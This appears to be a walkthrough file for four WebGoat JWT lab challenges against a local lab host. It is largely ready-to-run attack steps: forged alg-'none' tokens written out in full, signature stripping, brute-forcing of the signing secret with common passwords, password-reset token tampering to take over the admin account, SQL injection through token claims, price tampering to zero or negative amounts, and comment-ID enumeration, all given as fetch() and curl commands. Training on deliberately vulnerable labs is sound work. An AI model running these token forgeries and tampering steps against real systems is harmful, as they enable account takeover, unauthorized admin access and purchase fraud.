@@ -1,0 +1,555 @@
+===============================================
+  WEBGOAT JWT CHALLENGES - SPECIFIC SOLUTIONS
+===============================================
+
+Target: http://192.168.254.112:8001/WebGoat/JWT
+
+You have 4 challenges to complete. Here's how to solve each one.
+
+===============================================
+  CHALLENGE 1: BECOME ADMIN & RESET VOTES
+===============================================
+
+Goal: Change JWT token to become admin, then reset the votes
+
+STEP-BY-STEP SOLUTION:
+-----------------------
+
+Step 1: Get Your JWT Token
+---------------------------
+1. Login as "Tom" (you're already logged in)
+2. Open Browser DevTools (F12)
+3. Go to: Application > Cookies OR Network > Headers
+4. Look for JWT token (usually in Authorization header or Cookie)
+5. Copy the complete token
+
+Example location:
+- Cookie: access_token=eyJhbGci...
+- Header: Authorization: Bearer eyJhbGci...
+
+Step 2: Decode Token to See Structure
+---------------------------------------
+PowerShell:
+.\jwt_automation.ps1
+Choose option: 1 (Decode JWT)
+Paste your token
+
+You'll see something like:
+{
+  "sub": "Tom",
+  "admin": false,
+  "iat": 1234567890
+}
+
+Step 3: Tamper Token - Make Yourself Admin
+--------------------------------------------
+PowerShell:
+.\jwt_automation.ps1
+Choose option: 2 (Make Admin)
+Paste your token
+
+This changes: "admin": false → "admin": true
+
+Copy the tampered token!
+
+Step 4: Use Tampered Token
+----------------------------
+METHOD A - Replace in Browser:
+1. F12 > Application > Cookies
+2. Find the JWT cookie
+3. Delete old value
+4. Paste tampered token
+5. Refresh page
+
+METHOD B - Use Fetch in Console:
+F12 > Console, paste:
+
+fetch('http://192.168.254.112:8001/WebGoat/JWT/votings', {
+  method: 'POST',
+  headers: {
+    'Authorization': 'Bearer eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE3NjY1NjAyMTksInVzZXIiOiJUb20iLCJhZG1pbiI6dHJ1ZX0.E4hILBbUQtVusHANWYz4NGFxQ1-7MxgPzpGv6ZJ6pgnRyVjsoP93EV-Svq3mW_ZAO2iTw1PmpVnCuf-qq6ZFBg',
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify({action: 'reset'})
+}).then(r => r.json()).then(console.log)
+
+METHOD C - cURL:
+curl -X POST http://192.168.254.112:8001/WebGoat/JWT/votings \
+  -H "Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE3NjY1NjAzMzksImFkbWluIjp0cnVlLCJ1c2VyIjoiVG9tIn0.SaNBKhQKkMgKJ27ddP3CboyckMdL4TEFGN0fbMW7wxjky25iEvqVHurX3x0hCnfmI8RdAOdKyF9wm-XBjqPbpA" \
+  -H "Content-Type: application/json" \
+  -d '{"action": "reset"}'
+
+Step 5: Reset Votes
+---------------------
+✅ PROVEN WORKING SOLUTION:
+
+STEP 1: Get Fresh Token
+------------------------
+F12 > Application > Cookies > http://192.168.254.112:8001
+Copy the "access_token" value
+
+Example token:
+eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE3NjY1NjI5ODksImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.signature...
+
+STEP 2: Generate Attack Token
+------------------------------
+Use this exact format (or run in PowerShell):
+
+Attack token structure:
+- Header: eyJhbGciOiJub25lIn0 (algorithm "none")
+- Payload: eyJpYXQiOjE3NjY1NjI5ODksImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ (admin="true")
+- No signature (ends with dot)
+
+Full attack token:
+eyJhbGciOiJub25lIn0.eyJpYXQiOjE3NjY1NjI5ODksImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.
+
+STEP 3: Replace Cookie in DevTools
+-----------------------------------
+1. F12 > Application > Cookies > http://192.168.254.112:8001
+2. Find "access_token" row
+3. Double-click the VALUE column
+4. Delete old value (Ctrl+A, Delete)
+5. Paste attack token (Ctrl+V)
+6. Press Enter
+
+STEP 4: Complete Challenge
+---------------------------
+Click "Delete" button next to any user OR refresh the page (F5)
+
+✅ Challenge Complete!
+
+IMPORTANT NOTES:
+- Cookie is HttpOnly (document.cookie returns "")
+- Must edit manually in DevTools Application tab
+- Token MUST end with a dot: ...payload.
+- Algorithm must be "none" (lowercase)
+
+ALTERNATIVE METHODS IF TAMPERING FAILS:
+-----------------------------------------
+
+Method 1: Algorithm "none"
+PowerShell Option 6 (Algorithm to "none" + remove signature)
+
+Method 2: Remove Signature
+PowerShell Option 7 (Remove signature only)
+
+Method 3: Try Different Admin Fields
+PowerShell Option 11 (Custom tamper)
+Try adding:
+- Field: isAdmin, Value: true
+- Field: role, Value: admin
+- Field: authorities, Value: ["ROLE_ADMIN"]
+
+===============================================
+  CHALLENGE 2: ADMIN LOST PASSWORD
+===============================================
+
+Goal: Find the admin password to login
+
+This challenge has multiple approaches:
+
+APPROACH 1: JWT Token Contains Password
+-----------------------------------------
+Sometimes the JWT token contains the password in plaintext!
+
+1. Get JWT token from password reset link or response
+2. Decode it:
+   .\jwt_automation.ps1
+   Option 1 (Decode)
+
+3. Look for fields like:
+   - "password": "actual_password"
+   - "resetToken": "password_here"
+   - "secret": "admin_password"
+
+APPROACH 2: Weak JWT Secret = Password
+----------------------------------------
+The JWT signing secret might BE the admin password!
+
+1. Get valid JWT token
+2. Brute force the secret:
+   .\jwt_automation.ps1
+   Option 8 (Brute Force Secret)
+
+Common admin passwords to try:
+- admin
+- password
+- admin123
+- webgoat
+- Admin123!
+
+3. If found, try logging in with that password
+
+APPROACH 3: Password Reset Token Tampering
+--------------------------------------------
+1. Request password reset for YOUR account
+2. Capture the reset JWT token
+3. Decode it to see structure
+4. Tamper it to reset ADMIN's password:
+   .\jwt_automation.ps1
+   Option 10 (Password Reset Attack)
+   Target username: admin
+
+5. Set new password for admin
+6. Login with: username: admin, password: your_new_password
+
+APPROACH 4: SQL Injection in JWT
+----------------------------------
+If JWT username is used in SQL query:
+
+1. Tamper token with SQL injection:
+   .\jwt_automation.ps1
+   Option 4 (SQL Injection)
+
+2. This sets username to: admin' OR '1'='1
+3. Might bypass authentication or leak password
+
+STEP-BY-STEP RECOMMENDED:
+--------------------------
+1. Try APPROACH 1 first (check if password in token)
+2. If not, try APPROACH 2 (brute force secret)
+3. If that fails, try APPROACH 3 (password reset tampering)
+4. Last resort: APPROACH 4 (SQL injection)
+
+===============================================
+  CHALLENGE 3: BUY SAMSUNG PHONE FOR FREE
+===============================================
+
+Goal: Purchase Samsung phone by manipulating price to $0
+
+STEP-BY-STEP SOLUTION:
+-----------------------
+
+Step 1: Add Phone to Cart
+---------------------------
+1. Browse to Samsung phone
+2. Click "Add to Cart" or "Buy Now"
+3. Proceed to checkout (don't complete yet)
+
+Step 2: Capture JWT with Price Info
+-------------------------------------
+1. Open DevTools (F12) > Network tab
+2. Look for requests to checkout/order endpoint
+3. Find JWT token that contains price information
+
+The token payload might look like:
+{
+  "item": "Samsung Phone",
+  "price": 999,
+  "quantity": 1,
+  "user": "Tom"
+}
+
+Step 3: Decode Token to Confirm Price Field
+---------------------------------------------
+.\jwt_automation.ps1
+Option 1 (Decode)
+Paste the token
+
+Look for price-related fields:
+- "price": 999
+- "total": 999
+- "amount": 999
+- "cost": 999
+
+Step 4: Tamper Token - Change Price to 0
+------------------------------------------
+.\jwt_automation.ps1
+Option 11 (Custom Tamper)
+Field name: price
+Value: 0
+
+Copy the tampered token!
+
+Alternative prices to try:
+- 0 (free)
+- -999 (credit to your account!)
+- 0.01 (one cent)
+
+Step 5: Complete Purchase with Tampered Token
+-----------------------------------------------
+METHOD A - Replace Token in Request:
+1. F12 > Network > Find checkout request
+2. Right-click > Copy > Copy as cURL
+3. Edit cURL to replace JWT token
+4. Run modified cURL
+
+METHOD B - Fetch API:
+fetch('http://192.168.254.112:8001/WebGoat/JWT/checkout', {
+  method: 'POST',
+  headers: {
+    'Authorization': 'Bearer YOUR_TAMPERED_TOKEN',
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify({
+    item: 'Samsung Phone',
+    price: 0,
+    quantity: 1
+  })
+}).then(r => r.json()).then(console.log)
+
+METHOD C - PowerShell Request:
+.\jwt_automation.ps1
+Option 12 (Send JWT Request)
+URL: http://192.168.254.112:8001/WebGoat/JWT/checkout
+Token: YOUR_TAMPERED_TOKEN
+Method: POST
+Body: {"item":"Samsung Phone","price":0,"quantity":1}
+
+✓ Samsung Phone purchased for $0!
+
+OTHER FIELDS TO TRY TAMPERING:
+--------------------------------
+If "price" doesn't work, try:
+- "total": 0
+- "amount": 0
+- "discount": 100 (100% discount)
+- "discountPercent": 1.0
+- "isFree": true
+- "promoCode": "FREE"
+
+===============================================
+  CHALLENGE 4: FIND FLAG IN PHOTO COMMENTS
+===============================================
+
+Goal: Find the flag somewhere in the comments
+
+STEP-BY-STEP SOLUTION:
+-----------------------
+
+Step 1: Navigate to Photo Comments
+------------------------------------
+1. Go to the photo with comments section
+2. Try posting a comment (as regular user)
+3. Capture the JWT token used
+
+Step 2: Decode Token to See Claims
+------------------------------------
+.\jwt_automation.ps1
+Option 1 (Decode)
+
+Look for fields like:
+- "canViewFlag": false
+- "isAdmin": false
+- "viewHidden": false
+- "accessLevel": 1
+
+Step 3: Tamper Token for Admin Access
+---------------------------------------
+Try multiple tampering approaches:
+
+Attempt 1 - Make Admin:
+.\jwt_automation.ps1
+Option 2 (Make Admin)
+
+Attempt 2 - Change Access Level:
+.\jwt_automation.ps1
+Option 11 (Custom Tamper)
+Field: accessLevel, Value: 999
+OR
+Field: canViewFlag, Value: true
+
+Attempt 3 - SQL Injection:
+.\jwt_automation.ps1
+Option 4 (SQL Injection)
+
+Step 4: View Comments with Tampered Token
+-------------------------------------------
+Refresh page or fetch comments:
+
+fetch('http://192.168.254.112:8001/WebGoat/JWT/comments', {
+  headers: {
+    'Authorization': 'Bearer YOUR_TAMPERED_TOKEN'
+  }
+}).then(r => r.json()).then(data => {
+  console.log('All comments:', data);
+  data.comments.forEach(c => {
+    if (c.includes('flag') || c.includes('FLAG')) {
+      console.log('FOUND FLAG:', c);
+    }
+  });
+})
+
+Step 5: Look for Hidden Comments
+----------------------------------
+The flag might be in:
+- Hidden comments (only visible to admin)
+- Comment metadata (check full response)
+- Encoded in comment text
+- In a specific comment ID
+
+Try fetching specific comment IDs:
+for(let i=1; i<=100; i++) {
+  fetch(`http://192.168.254.112:8001/WebGoat/JWT/comments/${i}`, {
+    headers: {'Authorization': 'Bearer TAMPERED_TOKEN'}
+  }).then(r => r.json()).then(console.log)
+}
+
+Step 6: Submit the Flag
+-------------------------
+Once you find the flag (looks like: flag{...} or similar):
+- Enter it in the challenge submission field
+- OR POST it to the endpoint:
+
+curl -X POST http://192.168.254.112:8001/WebGoat/JWT/flag \
+  -H "Authorization: Bearer YOUR_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"flag": "your_found_flag"}'
+
+✓ Flag Found!
+
+===============================================
+  GENERAL JWT ATTACK WORKFLOW
+===============================================
+
+FOR ALL CHALLENGES, FOLLOW THIS PATTERN:
+-----------------------------------------
+
+1. Capture JWT Token
+   └─> F12 > Application/Network > Find token
+
+2. Decode Token
+   └─> .\jwt_automation.ps1 > Option 1
+
+3. Identify Target Field
+   └─> Look for: admin, price, role, access, etc.
+
+4. Try Attacks in Order:
+   └─> Tampering (Option 2, 3, 11)
+   └─> Algorithm "none" (Option 6)
+   └─> Remove Signature (Option 7)
+   └─> Brute Force (Option 8)
+
+5. Test Tampered Token
+   └─> Browser console fetch() OR cURL
+
+6. Complete Challenge Action
+   └─> Reset votes, buy item, view flag, etc.
+
+===============================================
+  COMMON JWT ENDPOINTS
+===============================================
+
+Admin/Auth:
+- /WebGoat/JWT/login
+- /WebGoat/JWT/admin
+- /WebGoat/JWT/profile
+
+Voting:
+- /WebGoat/JWT/votings
+- /WebGoat/JWT/votings/reset
+
+Shopping:
+- /WebGoat/JWT/shop
+- /WebGoat/JWT/checkout
+- /WebGoat/JWT/cart
+
+Comments:
+- /WebGoat/JWT/comments
+- /WebGoat/JWT/comments/{id}
+- /WebGoat/JWT/flag
+
+Password Reset:
+- /WebGoat/JWT/reset
+- /WebGoat/JWT/password-reset
+
+Try these if specific endpoint unknown!
+
+===============================================
+  QUICK COMMANDS REFERENCE
+===============================================
+
+DECODE TOKEN:
+.\jwt_automation.ps1 > Option 1
+
+MAKE ADMIN:
+.\jwt_automation.ps1 > Option 2
+
+CHANGE PRICE TO 0:
+.\jwt_automation.ps1 > Option 11 > price > 0
+
+ALGORITHM "none":
+.\jwt_automation.ps1 > Option 6
+
+SQL INJECTION:
+.\jwt_automation.ps1 > Option 4
+
+PASSWORD RESET:
+.\jwt_automation.ps1 > Option 10 > admin
+
+BROWSER FETCH TEMPLATE:
+fetch('URL', {
+  method: 'POST',
+  headers: {
+    'Authorization': 'Bearer TOKEN',
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify({key: 'value'})
+}).then(r => r.json()).then(console.log)
+
+===============================================
+  TROUBLESHOOTING
+===============================================
+
+Problem: Tampered token rejected
+Solution: Try algorithm "none" (Option 6)
+
+Problem: Can't find JWT token
+Solution: Check Authorization header, Cookies, Response body
+
+Problem: Don't know which field to tamper
+Solution: Decode token first (Option 1), look for obvious fields
+
+Problem: Action still fails even with admin token
+Solution: Check if you need to refresh page or clear cache
+
+Problem: Can't find price field in token
+Solution: Token might be in checkout step, not cart step
+
+Problem: Flag not visible
+Solution: Try SQL injection or different access levels
+
+===============================================
+  SUCCESS CHECKLIST
+===============================================
+
+Challenge 1 (Become Admin):
+□ Captured JWT token
+□ Tampered admin: true
+□ Replaced token in browser
+□ Reset votes successfully
+□ Challenge marked complete
+
+Challenge 2 (Admin Password):
+□ Tried decoding token for password
+□ Tried brute forcing secret
+□ Tried password reset tampering
+□ Found/reset admin password
+□ Logged in as admin
+
+Challenge 3 (Free Phone):
+□ Added phone to cart
+□ Captured checkout token
+□ Tampered price to 0
+□ Completed purchase
+□ Got phone for free
+
+Challenge 4 (Find Flag):
+□ Navigated to comments
+□ Tampered token for admin access
+□ Viewed all comments
+□ Found hidden flag
+□ Submitted flag
+
+===============================================
+  YOU'RE READY!
+===============================================
+
+Start with Challenge 1 (easiest):
+1. .\jwt_automation.ps1
+2. Option 2 (Make Admin)
+3. Replace token in browser
+4. Reset votes
+5. Done! ✓
+
+Good luck with all 4 challenges! 🔐
